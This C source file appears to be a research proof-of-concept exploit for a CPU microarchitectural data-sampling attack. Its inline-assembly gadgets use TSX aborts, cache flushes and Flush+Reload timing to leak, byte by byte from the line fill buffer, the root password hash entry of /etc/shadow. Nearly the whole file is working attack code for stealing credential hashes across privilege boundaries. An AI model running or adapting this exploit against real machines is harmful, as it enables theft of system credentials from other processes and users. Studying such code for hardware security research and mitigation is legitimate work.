#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

#include "util.h"

#define CONFIDENCE_SCORE 1
#define DEFAULT_URL_END ":0:9999"

// ####################################################
#define DEFAULT_URL "root:$1"
#define DUMMY_HIT 0x23

#define CACHE_THRESHOLD 150
#define PROBE_STRIDE 4096

#define KNOWN_PREFIX_LEN 8 // "root:$1$"
#define HASH_LEN 22
#define SHADOW_ENTRY_LEN (KNOWN_PREFIX_LEN + SALT_MAX_LEN + 1 + HASH_LEN) // +1 for '$'

// range of valid shadow characters to check during reload
#define START_INDEX 0x24 // $
#define END_INDEX 0x7A  // z


// rounds before restarting to leak from the end
#define PHASE2_MAX_ROUNDS 15000000
// bytes to be leaked before starting in faster, more error prone phase 3
#define PHASE2_MIN_LEAKED_BYTES 3


unsigned char __attribute__((aligned(4096))) *buf;
unsigned char __attribute__((aligned(4096))) *buf2;
unsigned char __attribute__((aligned(4096))) *leak_mapping;
unsigned char hist[SECRET_LEN][BUF_SIZE];

/*
 * Leak reverse 1 byte with 7 byte mask. Used in phase 2.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse_single(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 7 bytes == 0x0
    "shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

/*
 * Leak reverse 2 bytes with 6 byte mask. Used in phase 3.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffff00ff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 6 bytes == 0x0
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte
    "shr $0x8, %%rax\n"             // cut off last byte: 0x3000000000001145->0x30000000000011, successful:0x0000000000001145->0x00000000000011
	"shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "andq %%r11, %%r12\n"            // cut off second last byte (already leaked in first buffer)
    "shl $0xc, %%r12\n"             // %%r12 * 4096
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}


// ####################################################
#define DEFAULT_URL "root:$1"


unsigned char secret[SECRET_LEN+2] = "_______________________________________";


static inline __attribute__((always_inline)) void tsxabort_leak_clflush(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffffff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 6 byte mask: if hit then last 6 bytes == 0x0
    
    // "rol $8, %%rax\n"
    
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte
    "andq %%r11, %%rax\n"           // zero out first byte
    "rol $0x10, %%rax\n"            // shift and rotate: 0x45000000000003->0x030000000045, 0x45000000000000->0x45
	"shl $0xc, %%rax\n"             // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "rol $0x10, %%r12\n"            // shift and rotate: 0x11450000000003->0x030000001145, 0x11450000000000->0x1145
    "shr $0x8, %%r12\n"             // cut off last byte (already leaked in first buffer)
    "shl $0xc, %%r12\n"             // %%r12 * 4096
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x23 << 0xc) to fail fast from F+R
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

void try_paper_code() {
    ALLOC_BUFFERS_SHADOW();

    flush(reloadbuffer);
    flush(reloadbuffer2);


    // prepare secret
    memcpy(secret, DEFAULT_URL, strlen(DEFAULT_URL));

    register uint64_t mask;
    int index;
    int update;
    int found_index;

    //
    // Phase 1: Leak 1st cache line (1 BYTE AT A TIME)
    //
    printf("\n\n############################################################\n\n");
    printf("Phase 1: Leak first cache line (1 byte at a time)\n");
    printf("Secret: %s\n", secret);
    printf("\n############################################################\n\n");

    found_index = strlen(DEFAULT_URL);
    size_t iter = 0;
    while(found_index < SHADOW_ENTRY_LEN + 1) {
        index = found_index - 7;  // 7 byte mask
        // use the last 7 bytes to compare and filter out noise
        mask = *((uint64_t *)&secret[index]) & 0xffffffffffffff;  // 7 bytes
        update = 0;

        while(1) {
            // leak value into buffer (single byte version)
            tsxabort_leak_clflush_reverse_single(leak + index, reloadbuffer2, index, mask, reloadbuffer, reloadbuffer2);
            iter++;

            // F+R -> mark found value
            for(int i=DUMMY_HIT; i<=END_INDEX; i++) {
                int time = time_flush_reload(reloadbuffer + PROBE_STRIDE * i);

                if(time < CACHE_THRESHOLD) {
                    if(i != DUMMY_HIT) {
                        printf("[iter %zu]Buf 1: 0x%x=%c\n", iter, i, i);
                        update = i;
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    continue;
                }

                printf("Found: 0x%x=%c, index: %d\n", update, update, found_index);
                secret[found_index] = update;
                found_index++;
                printf("%s\n", secret);
                break;
            }
        }
    }
}


int main(int argc, char* argv[]) {
    try_paper_code();
}